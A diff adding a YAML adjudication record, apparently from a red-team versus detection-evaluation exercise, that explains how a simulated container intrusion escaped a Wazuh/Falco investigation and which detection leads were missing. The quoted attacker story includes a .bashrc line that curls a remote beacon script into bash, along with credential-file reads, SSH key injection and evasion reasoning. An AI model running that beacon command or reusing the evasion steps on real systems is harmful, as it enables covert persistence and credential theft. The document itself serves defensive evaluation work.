@@ -1,0 +1,91 @@
+outcome: survived
+outcome_rationale: |
+  L-001's oracle projected only the focal attack event in the 7-day history window; the investigation found 18 events. This apparent divergence is actually consistent with the story: M's exec would be the 18th event, byte-for-byte identical to the prior 17 health-check execs, so the investigation's "automated probe" conclusion is wrong but arrives from evidence fully compatible with the attack having occurred. L-002's oracle (focal event only, no surrounding attack-generated alerts) matches the investigation's finding that the rule 100002 co-occurrences are sshd FPs unrelated to M's activity. L-003's empty projection was confirmed. No lead queried any post-entry operation (credential reads, filesystem writes, ping sweep), so the attack's most impactful steps were never tested. No lead result refutes any story claim.
+
+encounter_analysis: |
+  **L-001 (position 0, wazuh/falco-container-shell-history):** The oracle projected a single event — the focal attack exec. The investigation found 18 rule 100001 events over 7 days on target-endpoint, all with identical cmdline `bash -c whoami`, in clustered bursts. The investigation used this pattern to conclude "automated health-check liveness probe, not interactive dev ops." This result is **consistent with** the oracle projection: if M attacked, M's exec would be the 18th event, indistinguishable in every queryable Falco field from the prior 17 health-check events. The oracle's single-event output reflects that the attack adds exactly one event to an existing baseline — which is precisely why the attack survives.
+
+  **L-002 (position 1, wazuh/alerts-around-event):** The oracle projected only the focal alert — no surrounding attack-generated events. The investigation found 12 rule 100002 alerts (possible reverse shell) starting 4 seconds before the focal event, from sshd stdio-redirect activity toward 172.22.0.10, plus 93 total fleet alerts. These rule 100002 FPs are background SSH session noise independent of M's activity. The actor's bypass section explicitly claimed that post-entry operations "do not trigger the reverse-shell rule." The investigation's finding is **consistent with** the oracle: the attack generates no surrounding alerts, and the sshd FPs are environmental noise that existed regardless. The rule 100002 FPs absorbed a full investigation loop (l-003) before being de-escalated.
+
+  **L-003 (position 2, wazuh/falco-reverse-shell-events):** The oracle projected `events: []`. The investigation confirmed all 8 rule 100002 events in the window are sshd performing normal dup2 syscalls for SSH session fd setup, with no non-sshd process involved. **Silent on** the attack story — the attack produces no events at this position, and the investigation confirmed the only events present are FPs.
+
+  **Synthesis:** Every lead's actual result is consistent with the oracle projection. The health-check baseline (l-001) makes M's exec invisible. The sshd FP noise (l-002/l-003) drew attention and was correctly characterized, but neither confirms nor refutes M's presence. The entire post-entry attack surface — credential reads from `/workspace/.env`, `/etc/shadow` read, `.bashrc` callback injection, `/root/.ssh/authorized_keys` creation, and the internal bash ping sweep — was never queried. The investigation had no lead capable of detecting any of steps 2–6 of the actor's story.
+
+defender_findings:
+  - type: analyze-discipline
+    subject_anchor: l-001
+    subject_topic: recurring pattern used to clear individual event without distinguishing membership
+    finding: |
+      The investigation used l-001's 18-event history to conclude the focal event was an automated health-check probe, but never tested whether the 18th event could be a malicious exec embedded within that legitimate baseline. The actor's story is predicated on exactly this: M's `docker exec` produces a `bash -c whoami` identical in every Falco-visible field to the prior 17 health-check execs — same cmdline, same container, same user uid, same exe_flags, same null pname, same loginuid=-1. The investigation note "clustered bursts consistent with automated health-check probe, not interactive dev ops" characterizes the 17-event prior pattern accurately, but mechanically applies that characterization to the 18th event without any independent verification that this specific event belongs to the same source.
+
+      The oracle's projection for l-001 (only the focal event) captures this gap: the attack contributes exactly one event to a pre-existing series. A tighter analyze step would ask whether this event's timing is metrically consistent with the health-check cadence (the 7-day burst pattern has 5 on 05-01, 8 on 05-03, 1 on 05-07 — the 05-07 event is a single isolated occurrence outside the burst cadence, not a cluster), or whether the SSH session originator for this specific exec differs from prior ones.
+    citations:
+      - source: investigation
+        quote: |
+          l-001 (shell-spawn-history-baseline): Returned 18 rule 100001 events in 7d for target-endpoint, all with identical cmdline `bash -c whoami`. Clustered in bursts (2026-05-01: 5, 2026-05-03: 8, 2026-05-07: 1). Sparse but recurring — consistent with automated health-check probe, not interactive dev ops.
+      - source: actor
+        quote: |
+          M runs `docker exec -it 2a124a5fc6d9 bash` against the `target-endpoint` container at 14:25:22 UTC. This is an entirely routine operation for a container operator — Falco fires the alert on the `bash -c whoami` that M types first to confirm root context. That single `whoami` is all the alert captures.
+      - source: projected_telemetry
+        quote: |
+          position: 0
+          system: wazuh
+          template: falco-container-shell-history
+          events:
+            - (single event — the focal 100001 alert only; no prior history events projected)
+
+  - type: lead-set
+    subject_anchor: no-lead-exists
+    subject_topic: post-entry container filesystem write activity
+    finding: |
+      All three investigation leads address the shell spawn event and its alert context. No lead queries for filesystem write activity inside the container after the shell spawn. The actor's post-entry steps — reading `/workspace/.env` for API credentials (T1552.001), reading `/etc/shadow` (T1003.008), injecting an SSH public key into `/root/.ssh/authorized_keys` (T1098.004), and appending a callback stub to `/root/.bashrc` (T1546.004) — are each small non-destructive or targeted-write operations that produce no Falco execve or network events. The actor stated this explicitly: "reads generate no Falco write events; the .bashrc write is a single small edit that does not match outbound connection patterns."
+
+      The investigation closed as benign with no evidence either confirming or refuting any of steps 2–5 of the actor's story. A lead querying Wazuh FIM events (the `wazuh-rule-550` signature is deployed in this environment) for the target-endpoint container's `/root/` and `/workspace/.env` paths in the post-exec window would be the natural candidate, but no such lead was constructed or considered.
+    citations:
+      - source: actor
+        quote: |
+          The subsequent operations (file reads, `.bashrc` edit, bash-native ping sweep) do not trigger the reverse-shell rule (`100002`) or file-integrity rules because: reads generate no Falco write events; the `.bashrc` write is a single small edit that does not match outbound connection patterns; the ping sweep uses bash builtins and system ping rather than any tool Falco flags by rule.
+      - source: investigation
+        quote: |
+          :L findings [id|loop|name|target|mode?|tests|system|template|query|window]
+          l-001|1|shell-spawn-history-baseline|v-001||h-001,h-002|wazuh|falco-container-shell-history|container_name=target-endpoint|7d
+          l-002|1|surrounding-alerts-context|v-001||h-001,h-002|wazuh|alerts-around-event|container_name=target-endpoint t0=2026-05-07T14:25:22Z|±15m
+          l-003|2|reverse-shell-alert-detail|v-001||h-001,h-002|wazuh|falco-reverse-shell-events|container_name=target-endpoint rule_id=100002 t0=2026-05-07T14:25:18Z|±5m
+
+  - type: observability
+    subject_anchor: wazuh
+    subject_topic: FIM coverage for container-interior high-value paths unknown and unqueried
+    finding: |
+      The `wazuh` system's file integrity monitoring capability is deployed in this environment (wazuh-rule-550 covers FIM events). It was never queried during this investigation. Whether the Wazuh agent on target-endpoint has syscheck configured to watch container-interior paths such as `/root/.bashrc`, `/root/.ssh/`, or bind-mounted credential paths like `/workspace/.env` is not established by the investigation. The actor's persistence steps (T1098.004 authorized_keys injection, T1546.004 .bashrc callback) are exactly the class of write operations FIM is designed to surface — targeted small writes to high-value credential and shell-init paths that generate no Falco process or network signal.
+
+      This is both a lead-set gap (no FIM lead was run) and an underlying observability question: even if such a lead had been constructed, the detection outcome depends on whether syscheck is watching the relevant container-interior paths. The investigation provides no evidence either way, making the FIM surface deployment-unknown for this specific container's filesystem scope.
+    citations:
+      - source: actor
+        quote: |
+          M creates `/root/.ssh/` if absent, then appends their personal SSH public key to `/root/.ssh/authorized_keys` with `chmod 600`.
+          M appends a one-liner to `/root/.bashrc`:
+          (curl -s http://203.0.113.44:4444/beacon.sh | bash) 2>/dev/null &
+          This fires silently on any subsequent interactive root session, forking a background callback.
+      - source: investigation
+        quote: |
+          Loop decision: h-001 is now `++`, h-002 is `--`. The case is:
+          - Shell was spawned via SSH from Docker-internal 172.22.0.10 → target-endpoint:22
+          - Pattern: 18 identical `bash -c whoami` events over 7 days → automated monitoring/health-check probe
+          - Rule 100002 co-occurrences are sshd FPs (normal dup2 syscalls for SSH session setup)
+          - No escalating commands, no persistence, no lateral movement
+
+actor_observations:
+  - type: framing-choice
+    subject_anchor: entry-vector
+    subject_topic: exploiting existing health-check baseline for exec camouflage
+    observation: |
+      The actor chose `bash -c whoami` as the initial exec command — the canonical single-shot root-context confirmation — which happens to be identical to the automated health-check commands already present 17 times in the 7-day history. This framing choice is load-bearing: the attack's entire initial footprint is a subset of the pre-existing baseline rather than an outlier, causing the investigation's l-001 pattern analysis to reinforce the benign verdict rather than raise suspicion. The actor predicted this explicitly in the bypass section ("The EXE_WRITABLE|EXE_LOWER_LAYER flags are standard... They appear on every container exec event in this environment"), and the prediction held.
+
+  - type: misprediction
+    subject_anchor: cover
+    subject_topic: rule 100002 FP noise was environment-native and absorbed investigator attention independently
+    observation: |
+      The actor's bypass reasoning addressed rule 100002 as a potential detection path and argued that post-entry operations would not trigger it. In practice, rule 100002 fired 12 times in the ±15m window from sshd dup2 FPs entirely unrelated to M's activity — a noise source the actor neither predicted nor controlled. The investigation spent a full loop (l-003) characterizing these FPs before concluding benign. The actor's bypass claim was correct on mechanism but arrived at the right outcome for the wrong reason: the FPs were de-escalated because they were sshd-sourced, not because no rule 100002 events fired.
+
+confidence: |
+  High confidence on the survived outcome: all three leads' actual results are consistent with the oracle projections once the health-check baseline is understood, and no post-entry lead existed to test any story claim. The analyze-discipline finding on l-001 is the sharpest claim and rests on the phrase "consistent with automated health-check probe, not interactive dev ops" — the inference gap (pattern presence used to clear individual event) is directly visible in the investigation text. The timing irregularity I note (single isolated 05-07 event outside burst cadence) is an inferential observation not directly asserted in the investigation, and a reviewer should verify the burst-cadence claim from the raw data. Moderate confidence on the FIM observability finding: whether syscheck covers container-interior paths for this specific container is genuinely unknown and the finding turns on that open question; if FIM is not configured for those paths, the finding is a hard observability gap rather than a lead-construction gap.
